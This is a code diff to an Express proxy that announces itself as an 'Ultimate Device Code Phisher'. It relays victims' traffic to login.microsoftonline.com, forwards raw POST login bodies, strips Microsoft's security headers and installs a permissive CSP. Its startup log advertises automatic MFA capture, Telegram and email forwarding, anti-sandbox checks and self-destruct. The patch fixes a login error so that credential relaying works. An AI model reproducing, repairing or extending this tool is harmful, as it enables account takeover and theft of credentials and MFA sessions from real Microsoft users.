@@ -1,8 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.2 – CSP‑Fixed Proxy
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.3 – Raw Body Proxy Fix
 // ============================================================
-// Removed Puppeteer, hardened proxy, safe decompression.
-// Fixed CSP to allow Microsoft CDN resources and our inline script.
+// Fixed AADSTS900144 error by forwarding raw POST buffers.
 // ============================================================
 
 const http = require('http');
@@ -432,19 +431,21 @@ function antiSandbox(req, res, next) {
 // ── Express App ──
 const app = express();
 app.use(express.json());
-const staticOpts = { index: false }; // prevent serving index.html automatically
+// 🔥 Now also allow form-urlencoded parsing so we can read incoming POST data
+app.use(express.urlencoded({ extended: true }));
+const staticOpts = { index: false };
 app.use(express.static('public', staticOpts));
 
-// 🔥 Update lastActivity on every request (must be after app is defined)
+// 🔥 Update lastActivity on every request
 app.use((req, res, next) => {
     lastActivity = Date.now();
     next();
 });
 
-// 🔥 CSP middleware – skip for proxy routes to avoid blocking Microsoft resources
+// 🔥 CSP middleware – skip for proxy routes
 app.use((req, res, next) => {
     if (req.path.startsWith('/login')) {
-        return next(); // let the proxy set its own permissive CSP
+        return next();
     }
     res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;");
     next();
@@ -647,9 +648,15 @@ app.all('/login*', async (req, res) => {
     headers['Host'] = 'login.microsoftonline.com';
 
     const method = req.method;
-    let body = null;
+    let bodyData = null;
+
+    // 🔥 CRITICAL FIX: Capture raw body correctly for POST requests (form data)
     if (method === 'POST' || method === 'PUT') {
-        body = req.body;
+        bodyData = await new Promise((resolve) => {
+            let buffers = [];
+            req.on('data', (chunk) => buffers.push(chunk));
+            req.on('end', () => resolve(Buffer.concat(buffers)));
+        });
     }
 
     try {
@@ -657,7 +664,7 @@ app.all('/login*', async (req, res) => {
             method: method,
             url: targetUrl,
             headers: headers,
-            data: method === 'POST' || method === 'PUT' ? body : undefined,
+            data: bodyData, // Pass the raw buffer directly
             responseType: 'arraybuffer', // Safer for compressed content
             timeout: 15000,
             maxRedirects: 0, // Handle redirects manually
@@ -779,12 +786,12 @@ app.all('/login*', async (req, res) => {
             }
         }
 
-        // 🔥 Remove any CSP from Microsoft to avoid conflicts, and set our permissive CSP
+        // Remove any CSP from Microsoft to avoid conflicts, and set our permissive CSP
         delete responseHeaders['content-security-policy'];
         delete responseHeaders['content-security-policy-report-only'];
 
         res.set(responseHeaders);
-        // 🔥 Set a permissive CSP that allows all resources and our inline script
+        // Set a permissive CSP that allows all resources and our inline script
         res.setHeader('Content-Security-Policy', "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data:; connect-src *;");
         res.status(resp.status);
         res.send(data);
@@ -1013,7 +1020,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.2 – CSP‑Fixed Proxy running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.3 – Raw Body Proxy Fix running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1022,7 +1029,6 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
     console.log(`🚀 Full reverse-proxy with automatic MFA capture: ACTIVE`);
-    console.log(`⚠️ REMINDER: Delete public/login.html to avoid static file interception.`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
